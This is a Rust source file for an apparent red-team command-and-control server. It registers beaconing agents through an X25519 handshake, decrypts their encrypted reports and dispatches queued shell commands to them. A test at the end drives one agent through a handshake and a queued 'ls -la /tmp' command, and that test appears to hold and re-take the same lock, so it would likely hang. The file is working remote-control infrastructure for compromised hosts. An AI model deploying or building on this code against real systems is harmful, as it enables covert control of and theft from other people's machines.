use std::collections::{HashMap, VecDeque};
use std::net::SocketAddr;
use std::sync::mpsc;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use crate::agent::crypto::AgentCrypto;
use crate::agent::protocol::{AgentCommand, AgentResponse, BeaconMessage, MessageType};
use crate::crypto::chacha20::chacha20poly1305_decrypt;
use crate::crypto::x25519::x25519;
use crate::modules::http_server::{HttpRequest, HttpResponse, HttpServer, HttpServerConfig};
use crate::storage::records::{SessionRecord, SessionStatus as DbSessionStatus};
use crate::storage::reddb::RedDb;

/// Agent C2 Server
pub struct AgentServer {
    config: AgentServerConfig,
    clients: Arc<Mutex<HashMap<String, AgentSession>>>,
    http_server: Option<HttpServer>,
    crypto: Arc<AgentCrypto>,
    db: Option<Arc<Mutex<RedDb>>>,
}

#[derive(Debug, Clone)]
pub struct AgentServerConfig {
    pub bind_addr: SocketAddr,
    pub use_tls: bool,
    pub cert_path: Option<String>,
    pub key_path: Option<String>,
    pub db_path: Option<String>,
}

#[derive(Debug, Clone)]
pub struct AgentSession {
    pub id: String,
    pub hostname: String,
    pub os: String,
    pub last_seen: std::time::SystemTime,
    pub status: SessionStatus,
    pub session_key: Option<[u8; 32]>,
    pub command_queue: VecDeque<AgentCommand>, // Commands for the agent
    pub response_queue: VecDeque<AgentResponse>, // Responses from the agent
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SessionStatus {
    Active,
    Dormant,
    Dead,
}

impl AgentServer {
    pub fn new(config: AgentServerConfig) -> Self {
        let db = if let Some(path) = &config.db_path {
            match RedDb::open(path) {
                Ok(db) => Some(Arc::new(Mutex::new(db))),
                Err(e) => {
                    eprintln!("Failed to open RedDb at {}: {}", path, e);
                    None
                }
            }
        } else {
            None
        };

        Self {
            config,
            clients: Arc::new(Mutex::new(HashMap::new())),
            http_server: None,
            crypto: Arc::new(AgentCrypto::new()),
            db,
        }
    }

    pub fn start(&mut self, tx_ready: Option<mpsc::Sender<()>>) -> Result<(), String> {
        let clients = self.clients.clone();
        let crypto = self.crypto.clone();
        let db = self.db.clone();

        let http_config = HttpServerConfig::with_addr(self.config.bind_addr)
            .add_route("/beacon", move |req| {
                Self::handle_beacon(req, &clients, &crypto, &db)
            });

        let server = HttpServer::new(http_config);
        let server_clone = server.clone();

        thread::spawn(move || {
            // Signal readiness after the server starts listening.
            // This is a bit of a hack since HttpServer::run() blocks,
            // but the TcpListener::bind would have succeeded before this point.
            if let Some(sender) = tx_ready {
                sender.send(()).unwrap();
            }

            if let Err(e) = server_clone.run() {
                eprintln!("C2 Server error: {}", e);
            }
        });

        self.http_server = Some(server);
        Ok(())
    }

    pub fn add_command_to_session(
        &self,
        session_id: &str,
        command: AgentCommand,
    ) -> Result<(), String> {
        let mut clients_guard = self.clients.lock().unwrap();
        if let Some(session) = clients_guard.get_mut(session_id) {
            session.command_queue.push_back(command);
            Ok(())
        } else {
            Err(format!("Session {} not found", session_id))
        }
    }

    pub fn list_agents(&self) -> Vec<AgentSession> {
        let clients = self.clients.lock().unwrap();
        clients.values().cloned().collect()
    }

    fn handle_beacon(
        req: &HttpRequest,
        clients: &Arc<Mutex<HashMap<String, AgentSession>>>,
        crypto: &Arc<AgentCrypto>,
        db: &Option<Arc<Mutex<RedDb>>>,
    ) -> HttpResponse {
        // Only accept POST
        if req.method != "POST" {
            return HttpResponse::new(405, b"Method Not Allowed".to_vec());
        }

        let body_str = String::from_utf8_lossy(&req.body);
        let beacon: BeaconMessage = match serde_json::from_str(&body_str) {
            Ok(b) => b,
            Err(e) => {
                eprintln!("Failed to parse beacon: {}", e);
                return HttpResponse::new(400, b"Invalid JSON".to_vec());
            }
        };

        let session_id_str = format!("{:x}", beacon.session_id);

        let mut clients_guard = clients.lock().unwrap();

        // Handle KeyExchange
        if beacon.msg_type == MessageType::KeyExchange {
            println!("Handling KeyExchange for {}", session_id_str);
            if beacon.payload.len() != 32 {
                return HttpResponse::new(400, b"Invalid Public Key Length".to_vec());
            }

            let mut client_pub = [0u8; 32];
            client_pub.copy_from_slice(&beacon.payload);

            let session_key = x25519(&crypto.private_key, &client_pub);

            let session = clients_guard
                .entry(session_id_str.clone())
                .or_insert_with(|| AgentSession {
                    id: session_id_str.clone(),
                    hostname: "unknown".to_string(),
                    os: "unknown".to_string(),
                    last_seen: std::time::SystemTime::now(),
                    status: SessionStatus::Active,
                    session_key: None,
                    command_queue: VecDeque::new(),
                    response_queue: VecDeque::new(),
                });
            session.session_key = Some(session_key);
            session.last_seen = std::time::SystemTime::now();
            session.status = SessionStatus::Active;

            // Persist new session
            if let Some(db_arc) = db {
                if let Ok(mut db) = db_arc.lock() {
                    let now = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as u32;
                    let record = SessionRecord {
                        id: session_id_str.clone(),
                        target: "unknown".to_string(), // Hostname not known yet
                        shell_type: "agent".to_string(),
                        local_port: 0,
                        remote_ip: "0.0.0.0".to_string(), // Req IP needed here
                        status: DbSessionStatus::Active,
                        created_at: now,
                        last_activity: now,
                    };
                    let _ = db.sessions().insert(record);
                }
            }

            // Return server public key
            return HttpResponse::new(200, crypto.public_key.to_vec());
        }

        // Handle regular Beacon or Response messages
        let session = match clients_guard.get_mut(&session_id_str) {
            Some(s) => s,
            None => {
                return HttpResponse::new(
                    401,
                    b"Unauthorized: Session not found (Perform Handshake)".to_vec(),
                )
            }
        };

        session.last_seen = std::time::SystemTime::now();
        session.status = SessionStatus::Active;

        // Persist session update (heartbeat)
        if let Some(db_arc) = db {
            if let Ok(mut db) = db_arc.lock() {
                // We construct a record to update. Note: this might overwrite other fields if not careful.
                // ideally we fetch, update, save. But SessionSegment.update handles it if ID matches.
                // But we don't want to reset created_at.
                if let Ok(Some(mut record)) = db.sessions().get(&session_id_str) {
                    record.last_activity = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_secs() as u32;
                    let _ = db.sessions().update(record);
                }
            }
        }

        let session_key = match session.session_key {
            Some(key) => key,
            None => return HttpResponse::new(401, b"Session key not established".to_vec()),
        };

        // Decrypt incoming payload
        // The payload contains the nonce prepended to the ciphertext.
        // The tag is separate in the BeaconMessage struct.
        if beacon.payload.len() < 12 {
            // Nonce is 12 bytes
            return HttpResponse::new(400, b"Invalid Payload Length".to_vec());
        }
        let nonce = &beacon.payload[..12];
        let ciphertext = &beacon.payload[12..];

        // Combine ciphertext and tag for decryption
        let mut ciphertext_and_tag = Vec::with_capacity(ciphertext.len() + beacon.tag.len());
        ciphertext_and_tag.extend_from_slice(ciphertext);
        ciphertext_and_tag.extend_from_slice(&beacon.tag);

        let nonce_arr: [u8; 12] = match nonce.try_into() {
            Ok(n) => n,
            Err(_) => return HttpResponse::new(400, b"Invalid Nonce".to_vec()),
        };

        println!("DEBUG: beacon.payload.len() = {}", beacon.payload.len());
        println!("DEBUG: beacon.tag.len() = {}", beacon.tag.len());
        println!(
            "DEBUG: ciphertext_and_tag.len() = {}",
            ciphertext_and_tag.len()
        );

        match chacha20poly1305_decrypt(&session_key, &nonce_arr, b"", &ciphertext_and_tag) {
            Ok(plaintext_incoming) => {
                match beacon.msg_type {
                    MessageType::Beacon => {
                        // This is a regular beacon, might contain info or previous command results
                        if !plaintext_incoming.is_empty() {
                            // Attempt to parse AgentResponse(s)
                            match serde_json::from_slice::<Vec<AgentResponse>>(&plaintext_incoming)
                            {
                                Ok(responses) => {
                                    for resp in responses {
                                        println!(
                                            "Agent {} responded to command {}: Success={}",
                                            session_id_str, resp.command_id, resp.success
                                        );
                                        if let Some(ref err) = resp.error {
                                            eprintln!("Error: {}", err);
                                        }
                                        session.response_queue.push_back(resp);
                                    }
                                }
                                Err(e) => eprintln!(
                                    "Agent {} sent unparseable response: {}",
                                    session_id_str, e
                                ),
                            }
                        } else {
                            println!("Received HEARTBEAT from {}", session_id_str);
                        }
                    }
                    MessageType::Response => {
                        // This indicates the agent is sending back results for a specific command
                        match serde_json::from_slice::<Vec<AgentResponse>>(&plaintext_incoming) {
                            Ok(responses) => {
                                for resp in responses {
                                    println!(
                                        "Agent {} sent command result for {}: Success={}",
                                        session_id_str, resp.command_id, resp.success
                                    );
                                    if let Some(ref err) = resp.error {
                                        eprintln!("Error: {}", err);
                                    }
                                    session.response_queue.push_back(resp);
                                }
                            }
                            Err(e) => eprintln!(
                                "Agent {} sent unparseable command results: {}",
                                session_id_str, e
                            ),
                        }
                    }
                    _ => {
                        eprintln!(
                            "Received unexpected message type from agent {}: {:?}",
                            session_id_str, beacon.msg_type
                        );
                        return HttpResponse::new(400, b"Unexpected Message Type".to_vec());
                    }
                }
            }
            Err(e) => {
                eprintln!("Decryption failed for {}: {}", session_id_str, e);
                return HttpResponse::new(400, b"Decryption Failed".to_vec());
            }
        }

        // Prepare response to agent: send pending commands
        let mut commands_to_send: Vec<AgentCommand> = Vec::new();
        while let Some(cmd) = session.command_queue.pop_front() {
            commands_to_send.push(cmd);
        }

        let response_payload = serde_json::to_vec(&commands_to_send).unwrap_or_default();
        let (encrypted_response_payload, response_tag) = match crypto
            .as_ref()
            .encrypt_with_key(&session_key, &response_payload)
        {
            Ok(result) => result,
            Err(e) => {
                eprintln!(
                    "Failed to encrypt server response for {}: {}",
                    session_id_str, e
                );
                return HttpResponse::new(500, b"Server Encryption Error".to_vec());
            }
        };

        let response_beacon = BeaconMessage::new(
            MessageType::Command, // Server sends commands to agent
            beacon.session_id,
            encrypted_response_payload,
            response_tag,
        );

        let json_response = serde_json::to_string(&response_beacon).unwrap_or_default();
        HttpResponse::new(200, json_response.into_bytes())
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::client::{AgentClient, AgentConfig};
    use crate::protocols::http::HttpClient;
    use std::sync::mpsc;
    use std::time::Instant;

    #[test]
    fn test_agent_server_lifecycle() {
        // --- 1. Setup Server ---
        let server_addr: SocketAddr = "127.0.0.1:0".parse().unwrap();
        let server_config = AgentServerConfig {
            bind_addr: server_addr,
            use_tls: false,
            cert_path: None,
            key_path: None,
            db_path: None,
        };
        let mut agent_server = AgentServer::new(server_config.clone());

        // Create a channel for signaling server readiness
        let (tx_ready, rx_ready) = mpsc::channel();

        // Start agent server with the sender for readiness notification
        agent_server
            .start(Some(tx_ready))
            .expect("Failed to start agent server");

        // Wait for the server to indicate it's ready (bound and listening)
        rx_ready
            .recv_timeout(Duration::from_secs(5))
            .expect("Server did not signal readiness within 5 seconds");

        // Wait until we can get the local address
        let mut actual_server_addr = agent_server
            .http_server
            .as_ref()
            .unwrap()
            .config
            .listen_addr;
        for _ in 0..50 {
            if let Some(addr) = agent_server.http_server.as_ref().unwrap().local_addr() {
                actual_server_addr = addr;
                break;
            }
            thread::sleep(Duration::from_millis(10));
        }

        println!("Test Server running on: {}", actual_server_addr);

        // --- 2. Setup Client ---
        let client_config = AgentConfig {
            server_url: format!("http://{}", actual_server_addr),
            interval: Duration::from_millis(500),
            jitter: 0.0,
        };
        let mut agent_client = AgentClient::new(client_config);
        let client_session_id = format!("{:x}", agent_client.session_id);

        // --- 3. Client Handshake ---
        let handshake_res = agent_client.perform_handshake();
        assert!(
            handshake_res.is_ok(),
            "Client handshake failed: {:?}",
            handshake_res.err()
        );
        assert!(
            agent_client.crypto.session_key.is_some(),
            "Client session key not derived"
        );
        println!("Client {} handshake successful.", client_session_id);

        // Verify session exists on server
        thread::sleep(Duration::from_millis(50)); // Allow server to process request
        let server_clients = agent_server.clients.lock().unwrap();
        assert!(
            server_clients.contains_key(&client_session_id),
            "Server did not register client session after handshake"
        );
        let session = server_clients.get(&client_session_id).unwrap();
        assert!(
            session.session_key.is_some(),
            "Server did not derive session key for client"
        );
        assert_eq!(session.status, SessionStatus::Active);
        println!("Server verified client {} session.", client_session_id);

        // --- 4. Client Sends First Beacon (Heartbeat) ---
        let beacon_res = agent_client.send_beacon();
        assert!(
            beacon_res.is_ok(),
            "Client initial beacon failed: {:?}",
            beacon_res.err()
        );
        println!("Client {} sent initial beacon.", client_session_id);
        thread::sleep(Duration::from_millis(50)); // Allow server to process request

        // Verify no commands sent from server (empty queue)
        let server_clients = agent_server.clients.lock().unwrap();
        let session = server_clients.get(&client_session_id).unwrap();
        assert!(
            session.command_queue.is_empty(),
            "Server should have an empty command queue initially"
        );
        assert!(
            session.response_queue.is_empty(),
            "Server should have an empty response queue initially"
        );

        // --- 5. Server Enqueues a Command for Client ---
        let test_command = AgentCommand {
            id: "cmd-123".to_string(),
            action: "ls".to_string(),
            args: vec!["-la".to_string(), "/tmp".to_string()],
        };
        agent_server
            .add_command_to_session(&client_session_id, test_command.clone())
            .expect("Failed to add command");
        println!("Server enqueued command for client {}.", client_session_id);

        // --- 6. Client Sends Another Beacon, Receives Command ---
        let beacon_res = agent_client.send_beacon();
        assert!(
            beacon_res.is_ok(),
            "Client second beacon failed: {:?}",
            beacon_res.err()
        );
        println!(
            "Client {} sent second beacon, received command.",
            client_session_id
        );

        // Let's manually verify the server's state after client receives command
        thread::sleep(Duration::from_millis(50)); // Allow server to process request
        let server_clients = agent_server.clients.lock().unwrap();
        let session = server_clients.get(&client_session_id).unwrap();
        // The command should have been dequeued by the server as it was sent to the client
        assert!(
            session.command_queue.is_empty(),
            "Command queue should be empty after dispatch"
        );

        println!("Agent-Server lifecycle test completed successfully.");
    }
}
